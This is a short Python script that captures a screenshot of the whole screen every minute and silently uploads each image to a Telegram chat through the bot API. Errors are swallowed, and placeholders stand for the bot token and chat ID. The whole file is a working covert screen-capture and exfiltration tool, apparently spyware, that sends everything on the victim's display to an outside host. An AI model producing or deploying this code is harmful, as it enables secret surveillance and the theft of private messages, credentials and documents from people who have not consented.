import pyautogui
import requests
import time

def main():
  TELEGRAM_BOT_TOKEN = 'token'
  CHAT_ID = '-0000000000000'

  while 1:
    screenshot = pyautogui.screenshot()
    screenshot_file = 'screenshot.png'
    screenshot.save(screenshot_file)

    try:
      url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto'
      files = {'photo': open(screenshot_file, 'rb')}
      data = {'chat_id': CHAT_ID}
      response = requests.post(url, files=files, data=data)
    except Exception as e:
      _ = 0

    screenshot.close()
    
    seconds = 1 * 60
    time.sleep(seconds)

main()
